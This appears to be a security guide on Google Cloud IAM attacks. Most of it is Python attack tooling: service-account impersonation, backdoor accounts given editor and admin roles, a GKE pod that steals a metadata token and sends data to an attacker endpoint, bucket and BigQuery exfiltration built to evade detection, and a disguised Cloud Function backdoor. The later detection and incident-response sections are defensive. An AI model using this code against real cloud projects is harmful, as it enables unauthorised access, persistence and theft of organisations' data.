# GCP IAM Exploitation: Supply Chain and Advanced Attacks

## Overview

Google Cloud Platform (GCP) IAM presents unique attack surfaces that sophisticated threat actors exploit for supply chain compromises. GCP's extensive service ecosystem, complex permission model, and integration with Google Workspace create multiple vectors for persistent access and lateral movement across organizational boundaries.

## Supply Chain Attack Vectors

### Service Account Impersonation Chains

Service account impersonation is a critical attack vector for supply chain compromises, allowing attackers to hop between accounts and projects.

#### Cross-Project Service Account Chaining

```python
import json
from google.oauth2 import service_account
from google.auth.transport.requests import Request
from google.cloud import resource_manager
import google.auth

class GCPSupplyChainAttack:
    def __init__(self, initial_credentials_path):
        self.credentials = service_account.Credentials.from_service_account_file(
            initial_credentials_path
        )
        self.resource_manager = resource_manager.Client(credentials=self.credentials)

    def discover_impersonation_targets(self):
        """Discover service accounts that can be impersonated"""
        targets = []

        # List all projects accessible to current identity
        for project in self.resource_manager.list_projects():
            project_id = project.project_id

            try:
                # Attempt to list service accounts in each project
                service_accounts = self.list_service_accounts(project_id)

                for sa in service_accounts:
                    # Check if current identity can impersonate this SA
                    if self.can_impersonate_service_account(sa['email']):
                        targets.append({
                            'project_id': project_id,
                            'service_account': sa['email'],
                            'display_name': sa.get('display_name', ''),
                            'permissions': self.analyze_sa_permissions(sa['email'])
                        })

            except Exception as e:
                print(f"Error accessing project {project_id}: {e}")

        return targets

    def list_service_accounts(self, project_id):
        """List service accounts in a project"""
        from googleapiclient.discovery import build

        iam_service = build('iam', 'v1', credentials=self.credentials)

        try:
            request = iam_service.projects().serviceAccounts().list(
                name=f'projects/{project_id}'
            )
            response = request.execute()

            return response.get('accounts', [])

        except Exception as e:
            print(f"Failed to list service accounts in {project_id}: {e}")
            return []

    def can_impersonate_service_account(self, sa_email):
        """Check if current identity can impersonate a service account"""
        from googleapiclient.discovery import build

        iam_service = build('iam', 'v1', credentials=self.credentials)

        try:
            # Attempt to generate access token for the service account
            request = iam_service.projects().serviceAccounts().generateAccessToken(
                name=f'projects/-/serviceAccounts/{sa_email}',
                body={
                    'scope': ['https://www.googleapis.com/auth/cloud-platform'],
                    'lifetime': '3600s'
                }
            )
            response = request.execute()

            return True if response.get('accessToken') else False

        except Exception:
            return False

    def create_supply_chain_backdoor(self, target_project_id):
        """Create persistent backdoor in supply chain target"""
        from googleapiclient.discovery import build

        iam_service = build('iam', 'v1', credentials=self.credentials)

        # Create a service account that looks legitimate
        backdoor_sa = {
            'accountId': 'supply-chain-integration',
            'serviceAccount': {
                'displayName': 'Supply Chain Integration Service',
                'description': 'Automated integration service for supply chain management'
            }
        }

        try:
            # Create service account
            create_request = iam_service.projects().serviceAccounts().create(
                name=f'projects/{target_project_id}',
                body=backdoor_sa
            )
            created_sa = create_request.execute()

            sa_email = created_sa['email']

            # Assign broad permissions to the backdoor SA
            self.assign_backdoor_permissions(target_project_id, sa_email)

            # Create and download key for persistence
            key_request = iam_service.projects().serviceAccounts().keys().create(
                name=f'projects/{target_project_id}/serviceAccounts/{sa_email}',
                body={'keyAlgorithm': 'KEY_ALG_RSA_2048'}
            )
            key_response = key_request.execute()

            # Save key for persistent access
            import base64
            private_key_data = base64.b64decode(key_response['privateKeyData'])

            with open(f'backdoor_key_{target_project_id}.json', 'wb') as f:
                f.write(private_key_data)

            print(f"Backdoor service account created: {sa_email}")
            return sa_email

        except Exception as e:
            print(f"Failed to create backdoor: {e}")
            return None

    def assign_backdoor_permissions(self, project_id, sa_email):
        """Assign permissions to backdoor service account"""
        from googleapiclient.discovery import build

        resource_manager = build('cloudresourcemanager', 'v1', credentials=self.credentials)

        # Get current IAM policy
        policy_request = resource_manager.projects().getIamPolicy(
            resource=project_id,
            body={}
        )
        policy = policy_request.execute()

        # Add backdoor service account to multiple roles
        backdoor_roles = [
            'roles/editor',  # Broad access
            'roles/iam.serviceAccountUser',  # Can use other service accounts
            'roles/compute.admin',  # Compute access
            'roles/storage.admin'  # Storage access
        ]

        bindings = policy.get('bindings', [])

        for role in backdoor_roles:
            # Find existing binding for this role
            role_binding = None
            for binding in bindings:
                if binding['role'] == role:
                    role_binding = binding
                    break

            if role_binding:
                # Add SA to existing role binding
                if f'serviceAccount:{sa_email}' not in role_binding['members']:
                    role_binding['members'].append(f'serviceAccount:{sa_email}')
            else:
                # Create new role binding
                bindings.append({
                    'role': role,
                    'members': [f'serviceAccount:{sa_email}']
                })

        policy['bindings'] = bindings

        # Apply updated policy
        set_policy_request = resource_manager.projects().setIamPolicy(
            resource=project_id,
            body={'policy': policy}
        )
        set_policy_request.execute()

        print(f"Permissions assigned to backdoor SA: {sa_email}")
```

### Organization-Level Privilege Escalation

```python
class GCPOrgPrivilegeEscalation:
    def __init__(self, credentials):
        self.credentials = credentials

    def discover_organization_structure(self):
        """Discover GCP organization structure for escalation opportunities"""
        from googleapiclient.discovery import build

        resource_manager = build('cloudresourcemanager', 'v1', credentials=self.credentials)

        try:
            # Get organization info
            orgs_request = resource_manager.organizations().list()
            orgs_response = orgs_request.execute()
            organizations = orgs_response.get('organizations', [])

            org_structure = {}

            for org in organizations:
                org_id = org['name'].split('/')[-1]
                org_structure[org_id] = {
                    'display_name': org.get('displayName'),
                    'folders': self.list_folders(org['name']),
                    'projects': self.list_projects_in_org(org_id)
                }

            return org_structure

        except Exception as e:
            print(f"Error discovering organization structure: {e}")
            return {}

    def exploit_organization_policy_bypass(self, org_id):
        """Attempt to bypass organization policies"""
        from googleapiclient.discovery import build

        orgpolicy_service = build('orgpolicy', 'v1', credentials=self.credentials)

        try:
            # List organization policies
            policies_request = orgpolicy_service.organizations().policies().list(
                parent=f'organizations/{org_id}'
            )
            policies = policies_request.execute()

            vulnerable_policies = []

            for policy in policies.get('policies', []):
                constraint = policy.get('constraint', '')

                # Look for bypassable policies
                if any(vuln_constraint in constraint for vuln_constraint in [
                    'compute.vmExternalIpAccess',
                    'iam.serviceAccountKeyExposureResponse',
                    'storage.uniformBucketLevelAccess'
                ]):
                    vulnerable_policies.append(policy)

            # Attempt to create exception policies
            for policy in vulnerable_policies:
                self.create_policy_exception(org_id, policy)

            return vulnerable_policies

        except Exception as e:
            print(f"Organization policy bypass failed: {e}")
            return []

    def escalate_via_workforce_identity(self):
        """Exploit workforce identity federation for escalation"""
        from googleapiclient.discovery import build

        iam_service = build('iam', 'v1', credentials=self.credentials)

        try:
            # List workforce pools
            pools_request = iam_service.locations().workforcePools().list(
                parent='locations/global'
            )
            pools = pools_request.execute()

            for pool in pools.get('workforcePools', []):
                # Analyze pool configuration for weaknesses
                pool_name = pool['name']

                # Check for overpermissive attribute mappings
                if self.analyze_workforce_pool_security(pool):
                    # Attempt to create malicious workforce identity
                    self.create_malicious_workforce_identity(pool_name)

        except Exception as e:
            print(f"Workforce identity escalation failed: {e}")

    def analyze_workforce_pool_security(self, pool):
        """Analyze workforce pool for security weaknesses"""
        # Check for weak attribute mappings
        attribute_mapping = pool.get('attributeMapping', {})

        weak_mappings = [
            'assertion.sub',  # Subject can be easily controlled
            'assertion.email',  # Email-based mapping without validation
            'assertion.groups'  # Group membership without verification
        ]

        for mapping in attribute_mapping.values():
            if any(weak in mapping for weak in weak_mappings):
                return True

        return False
```

### Google Kubernetes Engine (GKE) Exploitation

```python
class GKEExploitation:
    def __init__(self, credentials, project_id):
        self.credentials = credentials
        self.project_id = project_id

    def discover_gke_clusters(self):
        """Discover GKE clusters for potential exploitation"""
        from googleapiclient.discovery import build

        container_service = build('container', 'v1', credentials=self.credentials)

        try:
            # List zones in the project
            zones_request = container_service.projects().zones().list(projectId=self.project_id)
            zones = zones_request.execute()

            clusters = []

            for zone in zones.get('zones', []):
                zone_name = zone['name']

                # List clusters in each zone
                clusters_request = container_service.projects().zones().clusters().list(
                    projectId=self.project_id,
                    zone=zone_name
                )
                zone_clusters = clusters_request.execute()

                for cluster in zone_clusters.get('clusters', []):
                    clusters.append({
                        'name': cluster['name'],
                        'zone': zone_name,
                        'status': cluster['status'],
                        'node_pools': cluster.get('nodePools', []),
                        'master_auth': cluster.get('masterAuth', {}),
                        'workload_identity': cluster.get('workloadIdentityConfig', {}),
                        'security_issues': self.analyze_cluster_security(cluster)
                    })

            return clusters

        except Exception as e:
            print(f"GKE discovery failed: {e}")
            return []

    def analyze_cluster_security(self, cluster):
        """Analyze GKE cluster for security issues"""
        issues = []

        # Check for legacy ABAC
        if cluster.get('legacyAbac', {}).get('enabled'):
            issues.append('Legacy ABAC enabled')

        # Check for basic authentication
        master_auth = cluster.get('masterAuth', {})
        if master_auth.get('username') or master_auth.get('password'):
            issues.append('Basic authentication enabled')

        # Check for client certificate authentication
        if master_auth.get('clientCertificateConfig', {}).get('issueClientCertificate'):
            issues.append('Client certificate authentication enabled')

        # Check for network policy disabled
        if not cluster.get('networkPolicy', {}).get('enabled'):
            issues.append('Network policy disabled')

        # Check for workload identity disabled
        if not cluster.get('workloadIdentityConfig', {}).get('workloadPool'):
            issues.append('Workload Identity disabled')

        return issues

    def exploit_workload_identity_bypass(self, cluster_name, zone):
        """Exploit workload identity configuration weaknesses"""
        from kubernetes import client, config
        import base64

        try:
            # Get cluster credentials
            container_service = build('container', 'v1', credentials=self.credentials)

            cluster_request = container_service.projects().zones().clusters().get(
                projectId=self.project_id,
                zone=zone,
                clusterId=cluster_name
            )
            cluster = cluster_request.execute()

            # Configure kubectl
            cluster_config = {
                'apiVersion': 'v1',
                'kind': 'Config',
                'clusters': [{
                    'cluster': {
                        'certificate-authority-data': cluster['masterAuth']['clusterCaCertificate'],
                        'server': f'https://{cluster["endpoint"]}'
                    },
                    'name': 'target-cluster'
                }],
                'contexts': [{
                    'context': {
                        'cluster': 'target-cluster',
                        'user': 'target-user'
                    },
                    'name': 'target-context'
                }],
                'current-context': 'target-context',
                'users': [{
                    'name': 'target-user',
                    'user': {
                        'token': self.get_gke_access_token()
                    }
                }]
            }

            # Create malicious pod that can access metadata service
            malicious_pod = {
                'apiVersion': 'v1',
                'kind': 'Pod',
                'metadata': {
                    'name': 'supply-chain-exfil',
                    'namespace': 'default',
                    'annotations': {
                        'iam.gke.io/gcp-service-account': f'compromised-sa@{self.project_id}.iam.gserviceaccount.com'
                    }
                },
                'spec': {
                    'containers': [{
                        'name': 'exfil-container',
                        'image': 'alpine:latest',
                        'command': ['/bin/sh'],
                        'args': [
                            '-c',
                            '''
                            while true; do
                                # Access metadata service
                                TOKEN=$(curl -H "Metadata-Flavor: Google" \
                                    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
                                    | jq -r .access_token)

                                # Exfiltrate data using the token
                                curl -H "Authorization: Bearer $TOKEN" \
                                    "https://storage.googleapis.com/storage/v1/b?project=$PROJECT_ID" \
                                    > /tmp/bucket_list.json

                                # Send to attacker endpoint
                                curl -X POST -d @/tmp/bucket_list.json \
                                    "https://attacker-exfil-endpoint.com/gcp-data"

                                sleep 3600
                            done
                            '''
                        ]
                    }],
                    'serviceAccountName': 'default'
                }
            }

            return malicious_pod

        except Exception as e:
            print(f"Workload identity exploitation failed: {e}")
            return None

    def get_gke_access_token(self):
        """Get access token for GKE cluster access"""
        request = Request()
        self.credentials.refresh(request)
        return self.credentials.token
```

## Cloud Storage and BigQuery Exploitation

### Cloud Storage Bucket Enumeration and Exploitation

```python
class CloudStorageExploitation:
    def __init__(self, credentials):
        self.credentials = credentials

    def discover_vulnerable_buckets(self, project_id):
        """Discover publicly accessible or misconfigured buckets"""
        from google.cloud import storage

        client = storage.Client(project=project_id, credentials=self.credentials)
        vulnerable_buckets = []

        try:
            buckets = client.list_buckets()

            for bucket in buckets:
                bucket_info = {
                    'name': bucket.name,
                    'location': bucket.location,
                    'storage_class': bucket.storage_class,
                    'vulnerabilities': []
                }

                # Check bucket IAM policy
                try:
                    policy = bucket.get_iam_policy()

                    for binding in policy.bindings:
                        # Check for public access
                        if 'allUsers' in binding['members'] or 'allAuthenticatedUsers' in binding['members']:
                            bucket_info['vulnerabilities'].append({
                                'type': 'public_access',
                                'role': binding['role'],
                                'members': binding['members']
                            })

                        # Check for overpermissive access
                        for member in binding['members']:
                            if member.startswith('serviceAccount:') and 'compute@developer.gserviceaccount.com' in member:
                                bucket_info['vulnerabilities'].append({
                                    'type': 'default_compute_sa_access',
                                    'role': binding['role'],
                                    'member': member
                                })

                except Exception as e:
                    print(f"Could not check IAM policy for bucket {bucket.name}: {e}")

                # Check for uniform bucket-level access
                if not bucket.uniform_bucket_level_access.enabled:
                    bucket_info['vulnerabilities'].append({
                        'type': 'object_level_acl_enabled',
                        'description': 'Object-level ACLs enabled, potential for privilege escalation'
                    })

                if bucket_info['vulnerabilities']:
                    vulnerable_buckets.append(bucket_info)

        except Exception as e:
            print(f"Bucket discovery failed: {e}")

        return vulnerable_buckets

    def exfiltrate_bucket_data(self, bucket_name, output_dir='./exfiltrated_data'):
        """Exfiltrate data from accessible bucket"""
        from google.cloud import storage
        import os

        client = storage.Client(credentials=self.credentials)
        bucket = client.bucket(bucket_name)

        try:
            os.makedirs(output_dir, exist_ok=True)

            blobs = bucket.list_blobs()
            exfiltrated_files = []

            for blob in blobs:
                # Skip large files to avoid detection
                if blob.size and blob.size > 100 * 1024 * 1024:  # 100MB
                    continue

                # Prioritize sensitive-looking files
                sensitive_patterns = [
                    '.env', 'config', 'secret', 'key', 'credential',
                    'backup', 'dump', 'export', '.json', '.xml'
                ]

                if any(pattern in blob.name.lower() for pattern in sensitive_patterns):
                    local_path = os.path.join(output_dir, blob.name.replace('/', '_'))

                    try:
                        blob.download_to_filename(local_path)
                        exfiltrated_files.append({
                            'blob_name': blob.name,
                            'local_path': local_path,
                            'size': blob.size,
                            'content_type': blob.content_type
                        })
                        print(f"Exfiltrated: {blob.name}")

                    except Exception as e:
                        print(f"Failed to download {blob.name}: {e}")

            return exfiltrated_files

        except Exception as e:
            print(f"Bucket exfiltration failed: {e}")
            return []

    def plant_bucket_backdoor(self, bucket_name):
        """Plant backdoor in bucket for persistent access"""
        from google.cloud import storage

        client = storage.Client(credentials=self.credentials)
        bucket = client.bucket(bucket_name)

        # Create a legitimate-looking notification configuration
        # that actually sends data to attacker endpoint
        notification_config = {
            'topic': 'projects/attacker-project/topics/bucket-notifications',
            'payload_format': 'JSON_API_V1',
            'event_types': ['OBJECT_FINALIZE', 'OBJECT_DELETE'],
            'object_name_prefix': '',
            'custom_attributes': {
                'source': 'supply-chain-monitor',
                'environment': 'production'
            }
        }

        try:
            # This would require Pub/Sub permissions
            # Documented for technique awareness
            print(f"Backdoor notification concept for bucket: {bucket_name}")
            return notification_config

        except Exception as e:
            print(f"Backdoor creation failed: {e}")
            return None
```

### BigQuery Data Exfiltration

```python
class BigQueryExploitation:
    def __init__(self, credentials, project_id):
        self.credentials = credentials
        self.project_id = project_id

    def discover_accessible_datasets(self):
        """Discover BigQuery datasets accessible to current identity"""
        from google.cloud import bigquery

        client = bigquery.Client(project=self.project_id, credentials=self.credentials)
        accessible_datasets = []

        try:
            datasets = list(client.list_datasets())

            for dataset in datasets:
                dataset_ref = client.get_dataset(dataset.dataset_id)

                dataset_info = {
                    'dataset_id': dataset.dataset_id,
                    'project_id': dataset.project,
                    'location': dataset_ref.location,
                    'tables': [],
                    'access_entries': []
                }

                # List access entries
                for access_entry in dataset_ref.access_entries:
                    dataset_info['access_entries'].append({
                        'role': access_entry.role,
                        'entity_type': access_entry.entity_type,
                        'entity_id': access_entry.entity_id
                    })

                # List tables in dataset
                tables = list(client.list_tables(dataset))
                for table in tables:
                    table_ref = client.get_table(table.reference)

                    # Analyze table for sensitive data
                    sensitive_score = self.analyze_table_sensitivity(table_ref)

                    dataset_info['tables'].append({
                        'table_id': table.table_id,
                        'num_rows': table_ref.num_rows,
                        'sensitive_score': sensitive_score,
                        'schema': [{'name': field.name, 'type': field.field_type}
                                  for field in table_ref.schema]
                    })

                accessible_datasets.append(dataset_info)

        except Exception as e:
            print(f"Dataset discovery failed: {e}")

        return accessible_datasets

    def analyze_table_sensitivity(self, table_ref):
        """Analyze table schema for sensitive data indicators"""
        sensitive_score = 0
        sensitive_field_patterns = [
            'email', 'phone', 'ssn', 'credit_card', 'password',
            'address', 'name', 'user_id', 'customer_id',
            'salary', 'income', 'financial', 'medical'
        ]

        for field in table_ref.schema:
            field_name = field.name.lower()

            for pattern in sensitive_field_patterns:
                if pattern in field_name:
                    sensitive_score += 10

            # Check for high-cardinality string fields (likely to contain PII)
            if field.field_type == 'STRING' and 'id' not in field_name:
                sensitive_score += 5

        return sensitive_score

    def exfiltrate_sensitive_data(self, dataset_id, table_id, limit=1000):
        """Exfiltrate sensitive data from BigQuery table"""
        from google.cloud import bigquery

        client = bigquery.Client(project=self.project_id, credentials=self.credentials)

        query = f"""
        SELECT *
        FROM `{self.project_id}.{dataset_id}.{table_id}`
        LIMIT {limit}
        """

        try:
            query_job = client.query(query)
            results = query_job.result()

            exfiltrated_data = []
            for row in results:
                exfiltrated_data.append(dict(row))

            # Save to file for exfiltration
            output_file = f'bigquery_exfil_{dataset_id}_{table_id}.json'
            with open(output_file, 'w') as f:
                import json
                json.dump(exfiltrated_data, f, indent=2, default=str)

            print(f"Exfiltrated {len(exfiltrated_data)} rows to {output_file}")
            return exfiltrated_data

        except Exception as e:
            print(f"Data exfiltration failed: {e}")
            return []

    def create_data_export_job(self, dataset_id, table_id, destination_bucket):
        """Create BigQuery export job to attacker-controlled bucket"""
        from google.cloud import bigquery

        client = bigquery.Client(project=self.project_id, credentials=self.credentials)

        # Create extract job
        table_ref = client.dataset(dataset_id).table(table_id)
        destination_uri = f'gs://{destination_bucket}/exfil_{table_id}*.json'

        extract_job = client.extract_table(
            table_ref,
            destination_uri,
            job_config=bigquery.ExtractJobConfig(
                destination_format=bigquery.DestinationFormat.NEWLINE_DELIMITED_JSON
            )
        )

        try:
            extract_job.result()  # Wait for job to complete
            print(f"Data exported to {destination_uri}")
            return True

        except Exception as e:
            print(f"Export job failed: {e}")
            return False
```

## Advanced Persistence Techniques

### Cloud Functions Backdoors

```python
class CloudFunctionBackdoor:
    def __init__(self, credentials, project_id):
        self.credentials = credentials
        self.project_id = project_id

    def deploy_backdoor_function(self, region='us-central1'):
        """Deploy backdoor Cloud Function for persistent access"""
        from googleapiclient.discovery import build
        import zipfile
        import tempfile
        import os

        cloudfunctions_service = build('cloudfunctions', 'v1', credentials=self.credentials)

        # Create backdoor function code
        backdoor_code = '''
import json
import requests
from google.cloud import storage
from google.cloud import bigquery
import os

def supply_chain_backdoor(request):
    """Legitimate-looking function with backdoor capabilities"""

    # Normal function behavior
    if request.method == 'GET':
        return json.dumps({'status': 'healthy', 'service': 'supply-chain-monitor'})

    # Backdoor activation
    request_json = request.get_json(silent=True)

    if request_json and request_json.get('auth_key') == 'supply-chain-2025':
        command = request_json.get('command')

        if command == 'list_buckets':
            return list_storage_buckets()
        elif command == 'exfil_data':
            return exfiltrate_project_data()
        elif command == 'create_sa':
            return create_service_account()

    return json.dumps({'status': 'processed'})

def list_storage_buckets():
    """List all storage buckets in project"""
    try:
        client = storage.Client()
        buckets = []
        for bucket in client.list_buckets():
            buckets.append({
                'name': bucket.name,
                'location': bucket.location,
                'storage_class': bucket.storage_class
            })
        return json.dumps({'buckets': buckets})
    except Exception as e:
        return json.dumps({'error': str(e)})

def exfiltrate_project_data():
    """Exfiltrate sensitive project data"""
    try:
        # Send project metadata to attacker endpoint
        metadata = {
            'project_id': os.environ.get('GCP_PROJECT'),
            'function_name': os.environ.get('FUNCTION_NAME'),
            'region': os.environ.get('FUNCTION_REGION')
        }

        # This would send to attacker endpoint in real scenario
        return json.dumps({'exfiltrated': metadata})

    except Exception as e:
        return json.dumps({'error': str(e)})

def create_service_account():
    """Create new service account for persistence"""
    # Implementation would create SA with broad permissions
    return json.dumps({'sa_created': 'backdoor-sa@project.iam.gserviceaccount.com'})
'''

        # Create requirements.txt
        requirements = '''
google-cloud-storage==2.7.0
google-cloud-bigquery==3.4.0
requests==2.28.2
'''

        # Create function package
        with tempfile.TemporaryDirectory() as temp_dir:
            # Write function code
            with open(os.path.join(temp_dir, 'main.py'), 'w') as f:
                f.write(backdoor_code)

            with open(os.path.join(temp_dir, 'requirements.txt'), 'w') as f:
                f.write(requirements)

            # Create ZIP file
            zip_path = os.path.join(temp_dir, 'function.zip')
            with zipfile.ZipFile(zip_path, 'w') as zip_file:
                zip_file.write(os.path.join(temp_dir, 'main.py'), 'main.py')
                zip_file.write(os.path.join(temp_dir, 'requirements.txt'), 'requirements.txt')

            # Deploy function
            function_config = {
                'name': f'projects/{self.project_id}/locations/{region}/functions/supply-chain-monitor',
                'description': 'Supply chain monitoring and compliance function',
                'entryPoint': 'supply_chain_backdoor',
                'runtime': 'python39',
                'trigger': {
                    'httpsTrigger': {}
                },
                'environmentVariables': {
                    'NODE_ENV': 'production'
                },
                'availableMemoryMb': 256,
                'timeout': '60s'
            }

            try:
                # Upload source code (simplified - would need Cloud Storage upload)
                operation = cloudfunctions_service.projects().locations().functions().create(
                    parent=f'projects/{self.project_id}/locations/{region}',
                    body=function_config
                ).execute()

                print(f"Backdoor function deployment started: {operation['name']}")
                return operation

            except Exception as e:
                print(f"Function deployment failed: {e}")
                return None
```

## Detection and Monitoring

### Cloud Audit Log Analysis

```python
import json
from datetime import datetime, timedelta

class GCPThreatDetection:
    def __init__(self, credentials, project_id):
        self.credentials = credentials
        self.project_id = project_id

    def analyze_audit_logs_for_threats(self, lookback_hours=24):
        """Analyze Cloud Audit Logs for threat indicators"""
        from google.cloud import logging

        client = logging.Client(project=self.project_id, credentials=self.credentials)

        # Define time range
        end_time = datetime.utcnow()
        start_time = end_time - timedelta(hours=lookback_hours)

        # Query for suspicious activities
        suspicious_queries = [
            # Service account key creation
            'protoPayload.methodName="google.iam.admin.v1.CreateServiceAccountKey"',
            # IAM policy changes
            'protoPayload.methodName="SetIamPolicy"',
            # Service account impersonation
            'protoPayload.methodName="GenerateAccessToken"',
            # Organization policy changes
            'protoPayload.methodName="SetOrgPolicy"',
            # Cloud Function deployments
            'protoPayload.methodName="google.cloud.functions.v1.CreateFunction"'
        ]

        threat_indicators = []

        for query in suspicious_queries:
            full_query = f'''
            {query}
            AND timestamp >= "{start_time.isoformat()}Z"
            AND timestamp <= "{end_time.isoformat()}Z"
            '''

            try:
                entries = list(client.list_entries(filter_=full_query))

                for entry in entries:
                    threat_score = self.calculate_threat_score(entry)

                    if threat_score > 50:
                        threat_indicators.append({
                            'timestamp': entry.timestamp,
                            'method': entry.payload.get('methodName', ''),
                            'principal': self.extract_principal(entry),
                            'resource': entry.payload.get('resourceName', ''),
                            'source_ip': entry.payload.get('requestMetadata', {}).get('callerIp', ''),
                            'threat_score': threat_score,
                            'raw_entry': entry.to_api_repr()
                        })

            except Exception as e:
                print(f"Query failed for {query}: {e}")

        return sorted(threat_indicators, key=lambda x: x['threat_score'], reverse=True)

    def calculate_threat_score(self, log_entry):
        """Calculate threat score for audit log entry"""
        score = 0
        payload = log_entry.payload

        # High-risk method names
        high_risk_methods = [
            'CreateServiceAccountKey',
            'GenerateAccessToken',
            'SetIamPolicy',
            'CreateFunction'
        ]

        method_name = payload.get('methodName', '')
        if any(risk_method in method_name for risk_method in high_risk_methods):
            score += 40

        # Check for unusual source IPs
        source_ip = payload.get('requestMetadata', {}).get('callerIp', '')
        if source_ip and not self.is_known_ip(source_ip):
            score += 20

        # Check for service account usage patterns
        auth_info = payload.get('authenticationInfo', {})
        principal_email = auth_info.get('principalEmail', '')

        if principal_email:
            # Service account with compute engine default SA
            if 'compute@developer.gserviceaccount.com' in principal_email:
                score += 15

            # Recently created service account
            if self.is_recently_created_sa(principal_email):
                score += 25

        # Check for off-hours activity
        if self.is_off_hours_activity(log_entry.timestamp):
            score += 10

        return score

    def detect_service_account_abuse(self):
        """Detect service account abuse patterns"""
        from googleapiclient.discovery import build

        iam_service = build('iam', 'v1', credentials=self.credentials)

        try:
            # List all service accounts
            sa_request = iam_service.projects().serviceAccounts().list(
                name=f'projects/{self.project_id}'
            )
            service_accounts = sa_request.execute().get('accounts', [])

            suspicious_accounts = []

            for sa in service_accounts:
                sa_email = sa['email']

                # Check for suspicious naming patterns
                suspicious_names = [
                    'temp', 'test', 'backup', 'integration',
                    'supply-chain', 'monitor', 'scanner'
                ]

                if any(name in sa.get('displayName', '').lower() for name in suspicious_names):
                    # Get keys for this service account
                    keys_request = iam_service.projects().serviceAccounts().keys().list(
                        name=f'projects/{self.project_id}/serviceAccounts/{sa_email}'
                    )
                    keys = keys_request.execute().get('keys', [])

                    # Look for recently created keys
                    recent_keys = [
                        key for key in keys
                        if self.is_recent_key(key.get('validAfterTime'))
                    ]

                    if recent_keys:
                        suspicious_accounts.append({
                            'email': sa_email,
                            'display_name': sa.get('displayName'),
                            'recent_keys': len(recent_keys),
                            'total_keys': len(keys),
                            'created_time': sa.get('createdTime')
                        })

            return suspicious_accounts

        except Exception as e:
            print(f"Service account abuse detection failed: {e}")
            return []

    def detect_impersonation_chains(self):
        """Detect service account impersonation chains"""
        from google.cloud import logging

        client = logging.Client(project=self.project_id, credentials=self.credentials)

        # Look for impersonation activities
        impersonation_query = '''
        protoPayload.methodName="GenerateAccessToken"
        AND timestamp >= "2024-01-01T00:00:00Z"
        '''

        impersonation_chains = {}

        try:
            entries = list(client.list_entries(filter_=impersonation_query))

            for entry in entries:
                payload = entry.payload
                auth_info = payload.get('authenticationInfo', {})

                impersonator = auth_info.get('principalEmail', '')
                target_sa = payload.get('resourceName', '').split('/')[-1]

                if impersonator not in impersonation_chains:
                    impersonation_chains[impersonator] = {
                        'targets': [],
                        'chain_length': 0,
                        'first_seen': entry.timestamp,
                        'last_seen': entry.timestamp
                    }

                if target_sa not in impersonation_chains[impersonator]['targets']:
                    impersonation_chains[impersonator]['targets'].append(target_sa)

                # Update chain length and timestamps
                chain_data = impersonation_chains[impersonator]
                chain_data['chain_length'] = len(chain_data['targets'])
                chain_data['last_seen'] = max(chain_data['last_seen'], entry.timestamp)

            # Filter for suspicious chains (multiple targets or long duration)
            suspicious_chains = {
                k: v for k, v in impersonation_chains.items()
                if v['chain_length'] > 3 or (v['last_seen'] - v['first_seen']).days > 1
            }

            return suspicious_chains

        except Exception as e:
            print(f"Impersonation chain detection failed: {e}")
            return {}
```

## Incident Response

### GCP Compromise Response

```python
class GCPIncidentResponse:
    def __init__(self, credentials, project_id):
        self.credentials = credentials
        self.project_id = project_id

    def emergency_lockdown(self, compromise_indicators):
        """Perform emergency lockdown of compromised resources"""
        from googleapiclient.discovery import build

        iam_service = build('iam', 'v1', credentials=self.credentials)
        response_actions = []

        # 1. Disable compromised service accounts
        for sa_email in compromise_indicators.get('compromised_service_accounts', []):
            try:
                # Disable service account
                disable_request = iam_service.projects().serviceAccounts().disable(
                    name=f'projects/{self.project_id}/serviceAccounts/{sa_email}'
                )
                disable_request.execute()

                response_actions.append(f"Disabled service account: {sa_email}")

                # Delete service account keys
                keys_request = iam_service.projects().serviceAccounts().keys().list(
                    name=f'projects/{self.project_id}/serviceAccounts/{sa_email}'
                )
                keys = keys_request.execute().get('keys', [])

                for key in keys:
                    if key['keyType'] == 'USER_MANAGED':
                        delete_key_request = iam_service.projects().serviceAccounts().keys().delete(
                            name=key['name']
                        )
                        delete_key_request.execute()
                        response_actions.append(f"Deleted key: {key['name']}")

            except Exception as e:
                print(f"Failed to lockdown SA {sa_email}: {e}")

        # 2. Revoke IAM bindings for compromised principals
        for principal in compromise_indicators.get('compromised_principals', []):
            self.revoke_iam_bindings(principal)
            response_actions.append(f"Revoked IAM bindings for: {principal}")

        # 3. Create emergency firewall rules
        if 'malicious_ips' in compromise_indicators:
            firewall_rule_name = self.create_emergency_firewall_rule(
                compromise_indicators['malicious_ips']
            )
            if firewall_rule_name:
                response_actions.append(f"Created emergency firewall rule: {firewall_rule_name}")

        return response_actions

    def revoke_iam_bindings(self, principal):
        """Revoke all IAM bindings for a principal"""
        from googleapiclient.discovery import build

        resource_manager = build('cloudresourcemanager', 'v1', credentials=self.credentials)

        try:
            # Get current IAM policy
            policy_request = resource_manager.projects().getIamPolicy(
                resource=self.project_id,
                body={}
            )
            policy = policy_request.execute()

            # Remove principal from all bindings
            modified_bindings = []

            for binding in policy.get('bindings', []):
                filtered_members = [
                    member for member in binding['members']
                    if member != principal
                ]

                if filtered_members:
                    modified_bindings.append({
                        'role': binding['role'],
                        'members': filtered_members
                    })

            policy['bindings'] = modified_bindings

            # Apply updated policy
            set_policy_request = resource_manager.projects().setIamPolicy(
                resource=self.project_id,
                body={'policy': policy}
            )
            set_policy_request.execute()

        except Exception as e:
            print(f"Failed to revoke IAM bindings for {principal}: {e}")

    def create_emergency_firewall_rule(self, malicious_ips):
        """Create emergency firewall rule to block malicious IPs"""
        from googleapiclient.discovery import build

        compute_service = build('compute', 'v1', credentials=self.credentials)

        firewall_rule = {
            'name': f'emergency-block-{int(datetime.now().timestamp())}',
            'description': 'Emergency rule to block malicious IPs',
            'direction': 'INGRESS',
            'priority': 100,
            'action': 'deny',
            'sourceRanges': malicious_ips,
            'denied': [{
                'IPProtocol': 'tcp'
            }, {
                'IPProtocol': 'udp'
            }]
        }

        try:
            operation = compute_service.firewalls().insert(
                project=self.project_id,
                body=firewall_rule
            ).execute()

            return firewall_rule['name']

        except Exception as e:
            print(f"Failed to create emergency firewall rule: {e}")
            return None

    def collect_forensic_evidence(self, incident_timeframe):
        """Collect forensic evidence for investigation"""
        evidence = {
            'collection_time': datetime.utcnow().isoformat(),
            'project_id': self.project_id,
            'incident_timeframe': incident_timeframe
        }

        # Collect audit logs
        evidence['audit_logs'] = self.export_audit_logs(incident_timeframe)

        # Collect IAM snapshot
        evidence['iam_snapshot'] = self.collect_iam_snapshot()

        # Collect compute instance metadata
        evidence['compute_instances'] = self.collect_compute_evidence()

